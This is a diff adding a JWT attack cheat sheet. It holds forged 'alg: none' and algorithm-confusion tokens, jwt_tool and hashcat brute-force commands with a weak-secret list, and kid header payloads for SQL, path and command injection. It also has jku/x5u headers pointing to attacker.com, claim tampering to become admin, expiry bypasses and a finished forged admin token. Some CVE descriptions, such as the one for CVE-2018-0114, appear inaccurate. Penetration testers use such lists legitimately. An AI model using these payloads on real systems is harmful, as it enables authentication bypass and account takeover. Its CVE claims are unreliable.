@@ -1,0 +1,277 @@
+# JWT (JSON Web Token) Vulnerabilities & Bypasses
+
+## ========================================
+## JWT STRUCTURE
+## ========================================
+
+# JWT Format: HEADER.PAYLOAD.SIGNATURE
+# Example:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+## ========================================
+## ALGORITHM CONFUSION (alg: RS256 → HS256)
+## ========================================
+
+# Change algorithm from RS256 to HS256
+# Use public key as HMAC secret
+# Header:
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+# Tool: jwt_tool
+python3 jwt_tool.py JWT_HERE -X k -pk public.pem
+
+## ========================================
+## NONE ALGORITHM BYPASS
+## ========================================
+
+# Header with alg: none
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+
+# Remove signature
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
+
+# Variations
+{
+  "alg": "None"
+}
+{
+  "alg": "NONE"
+}
+{
+  "alg": "nOnE"
+}
+
+## ========================================
+## WEAK SECRET BRUTE FORCE
+## ========================================
+
+# Use hashcat
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+
+# Use jwt_tool
+python3 jwt_tool.py JWT_HERE -C -d wordlist.txt
+
+# Use jwt-cracker
+jwt-cracker JWT_HERE [alphabet] [max-length]
+
+# Common weak secrets
+secret
+password
+123456
+admin
+jwt
+secret123
+mysecret
+
+## ========================================
+## KID (KEY ID) HEADER INJECTION
+## ========================================
+
+# SQL Injection in kid
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "key1' UNION SELECT 'secretkey'-- -"
+}
+
+# Path Traversal in kid
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../../../../../dev/null"
+}
+
+# Command Injection in kid
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "key1 | whoami"
+}
+
+## ========================================
+## JKU (JWK SET URL) HEADER INJECTION
+## ========================================
+
+# Point to attacker-controlled server
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "jku": "http://attacker.com/jwks.json"
+}
+
+# jwks.json on attacker server:
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "kid": "attacker-key",
+      "use": "sig",
+      "n": "BASE64_MODULUS",
+      "e": "AQAB"
+    }
+  ]
+}
+
+## ========================================
+## JWK HEADER INJECTION
+## ========================================
+
+# Embed malicious key in header
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "jwk": {
+    "kty": "RSA",
+    "kid": "attacker-key",
+    "use": "sig",
+    "n": "BASE64_MODULUS",
+    "e": "AQAB"
+  }
+}
+
+## ========================================
+## X5U (X.509 URL) HEADER INJECTION
+## ========================================
+
+# Point to attacker certificate
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "x5u": "http://attacker.com/cert.pem"
+}
+
+## ========================================
+## PAYLOAD MANIPULATION
+## ========================================
+
+# Privilege Escalation
+# Original payload:
+{
+  "sub": "user123",
+  "role": "user",
+  "iat": 1516239022
+}
+
+# Modified payload:
+{
+  "sub": "user123",
+  "role": "admin",
+  "iat": 1516239022
+}
+
+# Username Manipulation
+{
+  "sub": "admin",
+  "role": "user",
+  "iat": 1516239022
+}
+
+## ========================================
+## TIMESTAMP BYPASS
+## ========================================
+
+# Remove exp claim
+{
+  "sub": "user123",
+  "iat": 1516239022
+}
+
+# Set future exp
+{
+  "sub": "user123",
+  "iat": 1516239022,
+  "exp": 9999999999
+}
+
+# Set negative exp
+{
+  "sub": "user123",
+  "exp": -1
+}
+
+## ========================================
+## NULL SIGNATURE
+## ========================================
+
+# Empty signature
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIn0.
+
+## ========================================
+## CVE-2015-2951 (alg=none bypass)
+## ========================================
+
+# Remove alg from header
+{
+  "typ": "JWT"
+}
+
+## ========================================
+## CVE-2018-0114 (Cisco vulnerability)
+## ========================================
+
+# Use empty string as secret
+# Sign with empty HMAC secret
+
+## ========================================
+## TOOLS & COMMANDS
+## ========================================
+
+# jwt_tool - Full exploitation
+python3 jwt_tool.py JWT_HERE
+python3 jwt_tool.py JWT_HERE -X a  # All exploits
+python3 jwt_tool.py JWT_HERE -X n  # None algorithm
+python3 jwt_tool.py JWT_HERE -X k -pk public.pem  # Key confusion
+
+# Decode JWT (base64)
+echo "PAYLOAD" | base64 -d
+
+# Create custom JWT
+# 1. Create header and payload JSON
+# 2. Base64 encode both
+# 3. Concatenate with '.'
+# 4. Sign or leave empty
+
+## ========================================
+## TESTING CHECKLIST
+## ========================================
+
+1. Check if alg: none is accepted
+2. Try algorithm confusion (RS256 → HS256)
+3. Brute force weak secrets
+4. Test kid header injection
+5. Test jku header injection
+6. Test jwk header injection
+7. Manipulate payload claims
+8. Test timestamp bypass
+9. Check for CVEs
+10. Test signature validation
+
+## ========================================
+## EXAMPLE EXPLOITS
+## ========================================
+
+# Full exploit example (alg: none)
+# Original token:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIn0.SECRET
+
+# Modified header:
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+# Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+
+# Modified payload:
+{
+  "sub": "admin"
+}
+# Base64: eyJzdWIiOiJhZG1pbiJ9
+
+# Final token:
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
